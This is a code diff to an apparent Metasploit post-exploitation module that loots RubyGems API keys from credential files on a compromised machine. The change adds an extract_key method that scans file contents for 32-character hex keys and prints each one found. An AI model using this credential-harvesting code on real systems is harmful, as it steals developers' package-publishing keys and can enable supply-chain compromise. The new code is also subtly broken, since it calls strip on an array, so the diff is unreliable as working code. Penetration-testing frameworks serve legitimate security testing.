@@ -40,13 +40,25 @@ class Metasploit4 < Msf::Post
     download_key(paths)
   end
 
+  # Ruby gem credentials are pretty standard and can come
+  # in a few flavors, but the most common are straight yaml
+  # and json, both of which are colon delimited. I suppose
+  # you could concievably have more than one, but that'd be
+  # manually editing, and the first one is probably the best
+  # one anyway.
+  def extract_key(path)
+    data = read_file(path)
+    keys = data.split(":").strip.select {|k| k =~ /[0-9a-f]{32}/ }
+    keys.first
+  end
+
   def download_key(paths)
     print_status("Looting #{paths.count} files")
     paths.each do |path|
       path.chomp!
       next if ['.', '..'].include?(path)
 
-      rubygems_api_key = YAML.load(read_file(path))[:rubygems_api_key]
+      rubygems_api_key = extract_key(path)
       next unless rubygems_api_key
 
       print_good("Found a RubyGems API key: #{rubygems_api_key}")
